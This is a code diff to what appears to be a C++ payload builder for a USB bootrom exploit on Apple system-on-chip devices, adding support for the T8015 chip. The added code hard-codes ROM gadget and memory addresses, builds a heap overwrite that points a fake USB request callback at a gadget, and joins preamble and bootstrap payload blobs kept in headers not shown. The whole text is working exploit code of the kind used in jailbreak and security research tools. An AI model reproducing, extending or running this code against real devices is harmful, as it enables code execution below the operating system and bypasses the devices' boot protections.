@@ -13,6 +13,8 @@
 
 #include "bootstrap.h"
 #include "implant.h"
+#include "t8015_bootstrap.h"
+#include "t8015_preamble.h"
 
 struct PayloadAppendixA8A9 {
   RomTask synopsys_task{};
@@ -61,6 +63,16 @@ constexpr OffsetsA8A9 offsets_s8000 = {
     .usb_transfer_fn = 0x10000EE78,
     .chipid_base = 0x2102BC000,
     .usb_create_desc_fn = 0x10000E354,
+};
+
+struct OffsetsT8015 {
+  uint64_t nop_gadget;
+  uint64_t insecure_memory_base;
+};
+
+constexpr OffsetsT8015 offsets_t8015 = {
+    .nop_gadget = 0x10000a9c4,
+    .insecure_memory_base = 0x18001c000,
 };
 
 std::vector<uint8_t>
@@ -152,6 +164,23 @@ uint32_t PayloadBuilder::overwrite_size(Chip chip) {
   return offsetof(PayloadAppendixA8A9, synopsys_task.callout);
 }
 
+struct OverwriteT8015 {
+  RomUsbDeviceIoRequest usb_request;
+  uint64_t heap_pad_0;
+  uint64_t heap_pad_1;
+};
+
+std::vector<uint8_t> PayloadBuilder::make_overwrite(Chip chip) {
+  OverwriteT8015 overwrite;
+  overwrite.usb_request.callback = offsets_t8015.nop_gadget;
+  overwrite.usb_request.next = offsets_t8015.insecure_memory_base;
+  overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
+  overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
+
+  auto data = reinterpret_cast<uint8_t *>(&overwrite);
+  return {data, data + sizeof(OverwriteT8015)};
+}
+
 std::vector<uint8_t> PayloadBuilder::make_bootstrap(Chip chip) {
   return make_payload_a8a9(chip == Chip::T7000 ? offsets_t7000 : offsets_s8000,
                            bootstrap, bootstrap_len);
@@ -159,4 +188,12 @@ std::vector<uint8_t> PayloadBuilder::make_bootstrap(Chip chip) {
 
 std::vector<uint8_t> PayloadBuilder::make_implant() {
   return {implant, implant + implant_len};
+}
+
+std::vector<uint8_t> PayloadBuilder::make_payload_t8015_refactor_this() {
+  uint8_t data[t8015_preamble_len + t8015_bootstrap_len];
+  std::memcpy(data, t8015_preamble, t8015_preamble_len);
+  std::memcpy(data + t8015_preamble_len, t8015_bootstrap, t8015_bootstrap_len);
+
+  return {data, data + sizeof(data)};
 }
